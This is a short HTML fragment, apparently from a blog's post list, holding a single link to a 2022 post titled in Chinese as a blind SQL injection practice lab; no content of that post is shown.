-            <a href="/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/">盲注-SQL靶场</a>
           </li>
         
       </ul>
